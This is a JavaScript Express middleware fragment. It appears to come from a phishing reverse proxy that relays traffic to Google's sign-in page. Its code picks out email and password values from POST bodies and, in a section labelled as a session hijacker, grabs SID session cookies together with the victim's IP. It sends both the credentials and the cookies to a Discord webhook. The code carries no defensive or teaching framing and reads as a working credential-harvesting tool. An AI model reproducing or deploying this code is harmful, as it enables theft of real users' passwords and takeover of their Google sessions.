app.use((req, res) => {
  console.log(`[PROXY] ${req.method} ${req.originalUrl} received.`);
  
  // DEBUG: Log the entire body for POST requests
  if (req.method === 'POST') {
    console.log(`[DEBUG] POST Body Type: ${typeof req.body}`);
    if (req.body && typeof req.body === 'object') {
      console.log(`[DEBUG] POST Body Keys: ${Object.keys(req.body).join(', ')}`);
      console.log(`[DEBUG] POST Body Content: ${JSON.stringify(req.body).substring(0, 500)}`);
      
      // CHECK FOR PASSWD IN ANY FIELD
      const bodyStr = JSON.stringify(req.body);
      if (bodyStr.includes('passwd') || bodyStr.includes('email')) {
        console.log(`[CATCH] POTENTIAL CREDENTIALS DETECTED IN BODY`);
        // Extract if possible
        const username = req.body.email || req.body.emailOrPhone || req.body.identifier || 'unknown';
        const password = req.body.passwd || req.body.password || 'unknown';
        
        if (password !== 'unknown') {
           console.log(`[CREDENTIALS] CAPTURED: ${username} : ${password}`);
           sendToDiscord('Credential Capture (Debug)', [
             { name: 'Email', value: username, inline: true },
             { name: 'Password', value: password, inline: true },
             { name: 'Path', value: req.originalUrl, inline: false }
           ], 0x00ff00);
        }
      }
    } else {
      console.log(`[DEBUG] POST Body (Raw): ${req.body}`);
    }
  }

  // SESSION HIJACKER (Keep this)
  if (req.headers.cookie) {
    const cookies = req.headers.cookie;
    const sidMatch = cookies.match(/SID=([^;]+)/);
    if (sidMatch) {
      const sid = sidMatch[1];
      console.log(`[SESSION] HIJACK: SID=${sid.substring(0, 10)}...`);
      sendToDiscord('Session Hijack', [
        { name: 'SID', value: sid, inline: false },
        { name: 'IP', value: req.headers['x-forwarded-for'] || req.socket.remoteAddress, inline: false }
      ], 0x00aaff);
    }
  }

  // PROXY THE REQUEST
  proxy.web(req, res, {
    target: 'https://accounts.google.com',
    path: req.originalUrl
  });
});
